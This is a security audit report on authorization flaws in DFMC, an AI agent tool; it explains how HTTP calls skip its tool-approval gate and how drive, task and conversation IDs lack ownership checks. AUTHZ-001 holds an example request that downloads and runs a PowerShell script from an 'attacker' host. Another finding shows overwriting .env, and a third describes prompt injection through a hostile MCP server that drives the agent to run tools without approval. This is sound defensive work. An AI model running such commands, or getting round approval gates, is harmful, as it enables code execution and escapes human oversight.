# sc-authz — Authorization Findings

**Skill**: sc-authz
**Target**: DFMC (`D:\Codebox\PROJECTS\DFMC`)
**Date**: 2026-04-25
**Scope**: tool-approval gate, IDOR on conversation/task/drive resources, workspace path containment, sub-agent privilege scoping.

## Counts

| Severity | Count |
|---|---|
| Critical | 1 |
| High     | 2 |
| Medium   | 3 |
| Low      | 2 |
| Info     | 1 |
| **Total** | **9** |

---

## AUTHZ-001 (CRITICAL, Confidence HIGH) — HTTP-driven tool calls bypass the approval gate (`source="user"` design)

- **File**: `internal/engine/engine_tools.go:116-138, 218-244`; reachable via `ui/web/server_tools_skills.go:151-173` (`POST /api/v1/tools/{name}`), `ui/web/server_chat.go:60-114` (`POST /api/v1/chat`), and `ui/web/server_ws.go:244-266` (`POST /api/v1/ws` `tool` method)
- **CWE-285** (Improper Authorization), **CWE-269** (Improper Privilege Management)

The single-mandated tool-execution path is `executeToolWithLifecycle`. Its approval gate is **conditional**:

```go
// engine_tools.go:225
if source != "user" && e.requiresApproval(name) {
    decision := e.askToolApproval(ctx, name, params, source)
    ...
}
```

Every HTTP tool entrypoint funnels through `engine.CallTool`, which always tags the source as `"user"` (engine_tools.go:120):

```go
func (e *Engine) CallTool(ctx context.Context, name string, params map[string]any) (tools.Result, error) {
    ...
    res, err := e.executeToolWithLifecycle(ctx, name, params, "user")
```

Concretely:

| HTTP entry | Handler | Calls |
|---|---|---|
| `POST /api/v1/tools/{name}` | `handleToolExec` (`server_tools_skills.go:167`) | `s.engine.CallTool` |
| `POST /api/v1/ws` method=`tool` | `(c *wsConn).handleTool` (`server_ws.go:260`) | `c.engine.CallTool` |
| `POST /api/v1/chat` | `handleChat` → engine agent loop | tool calls labelled `source="agent"` (gated correctly) |

**Trace of a single `POST /api/v1/tools/run_command`:**

1. HTTP request → `bearerTokenMiddleware` (passes if token correct, or absent if auth=none)
2. Mux dispatch to `handleToolExec` (`server_tools_skills.go:151`)
3. `s.engine.CallTool(r.Context(), name, req.Params)` (line 167)
4. `Engine.CallTool` → `executeToolWithLifecycle(ctx, name, params, "user")` (engine_tools.go:120)
5. Approval gate: `source != "user"` is FALSE → **gate skipped**
6. Pre-tool hook fires
7. `executeToolWithPanicGuard` → `Tools.Execute` runs the command
8. Post-tool hook fires
9. Result returned

The approval gate has been bypassed entirely. A request like:

```
POST /api/v1/tools/run_command
Authorization: Bearer <token>
{"params":{"command":"powershell","args":["-Command","Invoke-WebRequest http://attacker/x.ps1 | iex"]}}
```

…will execute (subject to the `command.go` block list, which does not block `powershell` — see CWE-77 territory addressed in sc-cmdi).

**Impact** (per the brief's threat scenario):
- When `auth=none` (default): **any local process** that can reach 127.0.0.1:7777 (other users on multi-user box, container neighbors, browser via DNS rebinding, malicious local app) can execute every backend tool with no approval prompt and no hook gate.
- When `auth=token`: an attacker who cracks the token (timing leak per AUTH-001, XSS in workbench, leaked log file) gets the same authority as the operator.

The `webApprover` (deny-by-default, `ui/web/approver.go`) was specifically designed to mitigate this — but it's never consulted on the HTTP path because `source="user"` short-circuits the gate.

**Recommendation**:
- Tag HTTP-originated tool calls with `source="http"` (or another non-user label).
- Treat `source="http"` like `source="agent"`: subject to `RequireApproval` AND to `IsDestructive` auto-deny by default.
- Operators who want unattended HTTP execution would set `RequireApproval = []` AND `DFMC_APPROVE_DESTRUCTIVE=yes` — making the trust model explicit.

This is the **single most important authorization finding** in DFMC. It is the answer to the brief's central question: *yes, when auth=none on loopback, any local process can reach tool execution.*

---

## AUTHZ-002 (HIGH, Confidence HIGH) — `RequireApproval` defaults to empty list — even when source is gated, no tool is actually approval-gated

- **File**: `internal/engine/approver.go:94-106`, `internal/config/config_types.go:382-395`, `internal/config/defaults.go` (no entry)
- **CWE-1188** (Insecure Default Initialization of Resource)

`requiresApproval` returns true only when the tool name is on the explicit list:

```go
list := e.Config.Tools.RequireApproval
if len(list) == 0 { return false }
for _, n := range list { if n == "*" || n == name { return true } }
```

The default `Config.Tools.RequireApproval` is `nil` / empty — so even agent-initiated calls bypass the gate unless the operator hand-edits config. Combined with AUTHZ-001 (HTTP path bypasses the gate entirely), the practical reality is **the approval gate is dormant in the default configuration**. Hooks may still fire, but they cannot deny.

**Recommendation**: ship a sane default for `RequireApproval`:
```yaml
tools:
  require_approval:
    - run_command
    - write_file
    - apply_patch
    - delegate_task
```
…or at minimum, set `RequireApproval: ["*"]` and let the operator subtract.

---

## AUTHZ-003 (HIGH, Confidence HIGH) — Drive runs accessible cross-conceptual-session by ID

- **File**: `ui/web/server_drive.go:150-235, 283-303`
- **CWE-639** (Authorization Bypass Through User-Controlled Key) — single-user but contextually relevant

Drive runs are addressed by raw IDs (UUID-shaped, generated by `drive.NewRun`). Any caller authenticated to the web server can:

- `GET /api/v1/drive/{id}` — read full run record, including all TODOs, planner output, sub-agent outputs (which can include code snippets, secrets discovered during analysis, error messages with paths)
- `POST /api/v1/drive/{id}/resume` — resume any non-terminal run
- `POST /api/v1/drive/{id}/stop` — cancel any active run
- `DELETE /api/v1/drive/{id}` — delete any run

There is no scoping by initiator, no ACL, no tenant. DFMC is "single-user by design," but:

- On a multi-operator host where two engineers share `dfmc serve` (e.g. SSH'd into the same box, both setting `DFMC_WEB_TOKEN` to the same value), each can read/cancel the other's drive runs without notification.
- A bearer-token leak gives the attacker access to the **entire historical** run corpus (`store.List()`), which can contain prompts that include sensitive paths, project secrets, or proprietary code.
- Resume of an attacker-chosen run from a stopped state is effectively *replay of a privileged operation* under a different operator's intent.

**Recommendation**: stamp each run with the originating bearer-token fingerprint (e.g. `sha256(token)[:8]`) and refuse cross-fingerprint reads/resume/stop unless an admin role is asserted. At minimum, document that drive run IDs are unauthenticated within the auth perimeter.

---

## AUTHZ-004 (MEDIUM, Confidence HIGH) — Task store CRUD has no per-task ownership

- **File**: `ui/web/server_task.go` (entire file), `internal/taskstore/store.go`
- **CWE-639** (Authorization Bypass Through User-Controlled Key)

Same shape as AUTHZ-003: `GET/PATCH/DELETE /api/v1/tasks/{id}`, `GET /api/v1/tasks/tree|children|ancestors|roots` all operate on raw IDs with no ownership check. Single-user-by-design caveat applies, but the threat surface is real for multi-operator setups and for token-cracker scenarios.

**Recommendation**: same as AUTHZ-003. Stamp tasks with originator fingerprint; require fingerprint match on mutating ops.

---

## AUTHZ-005 (MEDIUM, Confidence MEDIUM) — `POST /api/v1/workspace/apply` bypasses tool approval AND the read-before-mutation gate (when called as engine method)

- **File**: `ui/web/server_workspace.go` (handleWorkspaceApply); `internal/tools/apply_patch.go`
- **CWE-285** (Improper Authorization)

Two paths exist for applying patches:
1. `POST /api/v1/tools/apply_patch` — goes through `engine.CallTool` → `executeToolWithLifecycle` → `apply_patch` tool → `EnsureReadBeforeMutation` (strict mode, hash equality required)
2. `POST /api/v1/workspace/apply` — direct call into engine workspace methods that bypass the tool layer

Path 2 is the more dangerous variant because:
- The "tools" layer's read-before-mutation enforcement (`internal/tools/engine.go` `EnsureReadBeforeMutation` `readGateStrict`) is bypassed.
- The destructive-tool flag `apply_patch` is bypassed.
- `webApprover` is unreachable.

Verify by tracing `handleWorkspaceApply`. If it shells out to `git apply` or directly modifies files without the read-gate, this is a usable authz bypass for an authenticated caller.

**Recommendation**: route `/api/v1/workspace/apply` through `engine.CallTool("apply_patch", ...)` so the same gates apply, OR (preferably) re-tag the call with `source="http"` per AUTHZ-001 so the gate engages.

---

## AUTHZ-006 (MEDIUM, Confidence HIGH) — File listing endpoint exposes `.env` if not in skip list

- **File**: `ui/web/server_files.go:107-131`
- **CWE-538** (File and Directory Information Exposure)

`listFiles` skips `.git, .dfmc, node_modules, vendor, dist, bin` directories, but does NOT filter individual files. A project root containing `.env`, `secrets.yaml`, `id_rsa`, `aws-credentials.json`, etc. will list these to any caller of `GET /api/v1/files`. The follow-up `GET /api/v1/files/{path...}` then serves their full contents (subject to `resolvePathWithinRoot` which only enforces *path containment*, not file-classification).

The architecture report explicitly notes `.env` is auto-loaded at startup as a common API-key location, making this a likely real-world disclosure path.

**Recommendation**: add a deny-list of leaf names (`.env*`, `id_rsa*`, `*.pem`, `*credentials*`, `*.key`) in `listFiles` and `handleFileContent`. Better: mount file endpoints under explicit `/api/v1/source/...` and reject `.dfmc/` and dotfiles by default.

---

## AUTHZ-007 (LOW, Confidence HIGH) — Conversation IDs accessible cross-session

- **File**: `ui/web/server_conversation.go` (handleConversationLoad, handleConversationBranches*)
- **CWE-639** (Authorization Bypass Through User-Controlled Key)

`POST /api/v1/conversation/load` accepts a raw ID and switches the engine's active conversation. Any token-holder can pivot the conversation context to any persisted ID — historical conversations may leak secrets used in prompts, paths typed by the user, or partial code snippets stored in JSONL. Same single-user-by-design qualifier; same multi-operator caveat.

---

## AUTHZ-008 (LOW, Confidence MEDIUM) — `resolvePathWithinRoot` permits writes to dotfiles inside project root

- **File**: `ui/web/server_files.go:143-183`
- **CWE-23** (Relative Path Traversal) — only path-traversal aspect is closed; classification gap remains

The path-containment guard correctly forbids `..`-escapes (lexical) and symlink-mediated escapes. It does NOT classify the resolved leaf — `<root>/.env`, `<root>/.dfmc/config.yaml`, `<root>/.git/config` are all writable via:

```
POST /api/v1/tools/write_file {"path":".env","content":"..."}
```

This intersects with AUTHZ-006: an attacker can both **read** sensitive files (server_files) and **write** them (write_file tool) without classification. Severity is bounded by AUTHZ-001 (which already grants run_command), but it's a separate finding because removing AUTHZ-001 still leaves this exposure for the agent loop.

**Recommendation**: extend `EnsureWithinRoot` (`internal/tools/engine.go:788`) with a `forbiddenLeafs` glob set: `.env*`, `.git/**`, `.dfmc/config.yaml`, `id_rsa*`, etc. The write-side check is the more important one because reads are bounded by SSRF/disclosure; writes can plant payloads (e.g. modify `.dfmc/config.yaml` hooks → see PRIV-003).

---

## AUTHZ-009 (INFO, Confidence HIGH) — Drive planner→executor chain inherits root authority but is contained by sub-agent semantics

- **File**: `internal/drive/driver.go`, `internal/engine/drive_adapter.go`, `internal/engine/agent_loop_native.go`
- **CWE-269** (Improper Privilege Management) — informational

Drive's planner is a fresh provider call (no tools, no history); the executor for each TODO is a sub-agent with the **full backend tool registry**. There is no per-TODO scope contraction — a TODO with `file_scope:["src/foo.go"]` only reserves the file for serial execution; it does NOT prevent the sub-agent from writing elsewhere. The `delegate_task` destructive-flag in `tools/destructive.go:29` correctly recognizes this transitive risk, so when `RequireApproval` includes `delegate_task`, sub-agent spawn is gated. But the default config doesn't gate it.

This is by-design "the agent has the same authority as the operator running it." Worth flagging only because the prompt-injection attack-surface (AUTHZ-001 + AUTHZ-002 + a hostile MCP server poisoning planner output, see PRIV-005) means an attacker who can shape the planner's prompt can coerce execution of arbitrary tools, with no approval prompt, in the default configuration.

---

## Summary table

| ID | Severity | Path | CWE |
|---|---|---|---|
| AUTHZ-001 | CRITICAL | engine_tools.go:225 | 285, 269 |
| AUTHZ-002 | HIGH | approver.go:94-106 | 1188 |
| AUTHZ-003 | HIGH | server_drive.go:150-303 | 639 |
| AUTHZ-004 | MEDIUM | server_task.go | 639 |
| AUTHZ-005 | MEDIUM | server_workspace.go | 285 |
| AUTHZ-006 | MEDIUM | server_files.go:107-131 | 538 |
| AUTHZ-007 | LOW | server_conversation.go | 639 |
| AUTHZ-008 | LOW | server_files.go:143-183 | 23 |
| AUTHZ-009 | INFO | drive/driver.go | 269 |

---

## Core finding restated

**The brief's central question:** *when an operator runs `dfmc serve` with auth=none on loopback, can any local process reach tool execution?*

**Answer: yes, unconditionally.** The chain is:
1. Loopback bind is reachable by every local process / browser-rebinding / container neighbor.
2. `auth=none` means no token gate.
3. `POST /api/v1/tools/run_command` calls `engine.CallTool` which tags `source="user"`.
4. `executeToolWithLifecycle` skips the approval gate when `source=="user"`.
5. The tool runs.

The webApprover deny-by-default is irrelevant because it's never consulted on this path.

When `auth=token` is enabled, the same path is reachable with a valid token — so a token-cracker (see AUTH-001 timing leak; XSS in workbench → localStorage; AUTH-002 token in URL) gets the same authority. There is no second-level gate.
